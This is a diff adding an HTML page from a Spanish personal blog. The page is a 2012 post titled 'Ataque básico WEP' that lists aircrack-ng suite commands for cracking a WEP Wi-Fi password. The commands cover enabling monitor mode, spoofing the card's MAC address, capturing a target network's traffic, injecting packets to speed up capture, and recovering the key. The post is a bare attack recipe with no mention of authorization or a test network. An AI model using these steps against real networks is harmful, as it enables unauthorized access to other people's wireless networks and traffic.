@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+          <title>RAMBORG's BLOG</title>
+        <meta charset="utf-8" />
+        
+
+		<link rel="stylesheet" href="./theme/css/bootstrap.min.css" type="text/css"/>
+		<link rel="stylesheet" href="./theme/css/custom.css" type="text/css"/>
+        
+
+
+
+    <meta name="tags" contents="Cracking" />
+    <meta name="tags" contents="wifi" />
+
+</head>
+
+<body id="index" class="home">
+	
+		<div class="container">
+		  <div class="header">
+			<ul class="nav nav-pills pull-right">
+			  <!--
+			  <li class="active"><a href="#">Home</a></li>
+			  <li><a href="#">About</a></li>
+			  <li><a href="#">Contact</a></li>
+			  -->
+                         <li><a href="./pages/about.html">
+                             Acerca de mi
+                          </a></li>
+              
+              <li class="dropdown">
+                <a href="#" class="dropdown-toggle" data-toggle="dropdown">Categorias <b class="caret"></b></a>
+                <ul class="dropdown-menu">
+                        <li >
+                            <a href="./category/applications.html">Applications</a>
+                        </li>
+                        <li >
+                            <a href="./category/applications-gnulinux.html">Applications, gnu/linux</a>
+                        </li>
+                        <li >
+                            <a href="./category/applications-programming.html">Applications, programming</a>
+                        </li>
+                        <li >
+                            <a href="./category/gnulinux.html">Gnu/linux</a>
+                        </li>
+                        <li >
+                            <a href="./category/misc.html">Misc</a>
+                        </li>
+                        <li >
+                            <a href="./category/other.html">Other</a>
+                        </li>
+                        <li >
+                            <a href="./category/programming.html">Programming</a>
+                        </li>
+                        <li class="active">
+                            <a href="./category/systems.html">Systems</a>
+                        </li>
+                        <li >
+                            <a href="./category/tips.html">Tips</a>
+                        </li>
+                        <li >
+                            <a href="./category/writing.html">Writing</a>
+                        </li>
+                </ul>
+              </li>
+              
+              <li><a href="./tags.html"><i class="fa fa-th-list"></i><span class="icon-label">Tags</span></a></li>
+              <li><a href="./archives.html"><i class="fa fa-th-list"></i><span class="icon-label">Archives</span></a></li>
+              
+			</ul>
+			<h3 class="text-muted"><a href="./">RAMBORG's BLOG <strong></strong></a></h3>
+		  </div>
+			
+			
+			
+<section id="content" class="body">
+  <header>
+    <h2 class="entry-title">
+      <a href="./ataque-basico-wep.html" rel="bookmark"
+         title="Permalink to Ataque básico WEP">Ataque básico WEP</a></h2>
+ 
+  </header>
+  <footer class="post-info">
+	  <!--
+    <abbr class="published" title="2012-06-20T15:22:00">
+      mié 20 junio 2012
+    </abbr>
+    -->
+    <div class="panel">
+                    <div class="panel-body">
+<footer class="post-info">
+    <span class="label label-default">Date</span>
+    <span class="published">
+        <i class="fa fa-calendar"></i><time datetime="2012-06-20T15:22:00"> mié 20 junio 2012</time>
+    </span>
+            <span class="label label-default">By</span>
+            <a href="./author/ramborg.html"><i class="fa fa-user"></i> ramborg</a>
+
+
+
+<span class="label label-default side-tag">Tags</span>
+	<a href="./tag/cracking.html">Cracking</a>
+        /
+	<a href="./tag/wifi.html">wifi</a>
+    
+</footer><!-- /.post-info -->                    </div>
+                </div>
+
+  </footer><!-- /.post-info -->
+  <div class="entry-content">
+    <p>Aunque ya casi esta anticuado este tipo de ataque, siguen quedando Wifis
+con seguridad WEP. Los pasos para conseguir el password de este tipos de
+puntos de accesos son:</p>
+<div class="highlight"><pre><span class="cp">#Ponemos tarjeta en modo promiscuo</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
+
+<span class="cp">#Cambiamos MAC de nuestra tarjeta </span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">ifconfig</span> <span class="n">mon0</span> <span class="n">down</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">macchanger</span> <span class="o">-</span><span class="n">m</span> <span class="mo">00</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">22</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">55</span> <span class="n">mon0</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">ifconfig</span> <span class="n">mon0</span> <span class="n">up</span>
+
+<span class="cp">#Escaneamos las redes que están a nuestro alcance</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="n">mon0</span>
+
+<span class="cp">#Volcamos el tráfico de red</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="n">c</span> <span class="p">[</span><span class="n">CH</span><span class="p">]</span> <span class="o">-</span><span class="n">w</span> <span class="p">[</span><span class="n">ESSID</span><span class="p">]</span> <span class="o">--</span><span class="n">bssid</span> <span class="p">[</span><span class="n">BSSID</span><span class="p">]</span> <span class="n">mon0</span>
+
+<span class="cp">#Inyectamos tráficos para capturar mas paquetes</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">1</span> <span class="mi">6000</span> <span class="o">-</span><span class="n">a</span> <span class="p">[</span><span class="n">BSSID</span><span class="p">]</span> <span class="o">-</span><span class="n">h</span> <span class="mo">00</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">22</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">55</span> <span class="n">mon0</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">2</span> <span class="o">-</span><span class="n">p</span> <span class="mi">0841</span> <span class="o">-</span><span class="n">c</span> <span class="n">FF</span><span class="o">:</span><span class="n">FF</span><span class="o">:</span><span class="n">FF</span><span class="o">:</span><span class="n">FF</span><span class="o">:</span><span class="n">FF</span><span class="o">:</span><span class="n">FF</span> <span class="o">-</span><span class="n">b</span> <span class="p">[</span><span class="n">BSSID</span><span class="p">]</span> <span class="o">-</span><span class="n">h</span> <span class="mo">00</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">22</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">55</span> <span class="n">mon0</span>
+
+<span class="cp">#Ponemos a descifrar la clave con los paquetes capturados</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">aircrack</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="n">z</span> <span class="p">[</span><span class="n">ESSID</span><span class="p">]</span><span class="o">*</span><span class="p">.</span><span class="n">cap</span>
+</pre></div>
+
+
+<p>La información de esta entrada a sido extraida del blog:  </p>
+<p><a href="http://elblogdepicodev.blogspot.com.es/2012/05/obtener-la-clave-de-una-red-wifi-wep.html">http://elblogdepicodev.blogspot.com.es/2012/05/obtener-la-clave-de-una-red-wifi-wep.html</a><br />
+via<br />
+<a href="http://planeta.archlinux-es.org/">http://planeta.archlinux-es.org/</a><br />
+via<br />
+<a href="https://planet.archlinux.org/">https://planet.archlinux.org/</a></p>
+  </div><!-- /.entry-content -->
+</section>
+			
+			
+			<hr>
+			<footer id="contentinfo" class="body footer">
+					<address id="about" class="vcard body">
+					Proudly powered by <a href="http://getpelican.com/">Pelican</a>,
+					which takes great advantage of <a href="http://python.org">Python</a>.
+					</address><!-- /#about -->
+			</footer><!-- /#contentinfo -->
+	</div>
+	
+	<script src="./theme/js/jquery.min.js"></script>
+
+	<!-- Include all compiled plugins (below), or include individual files as needed -->
+	<script src="./theme/js/bootstrap.min.js"></script>
+	
+</body>
+</html>
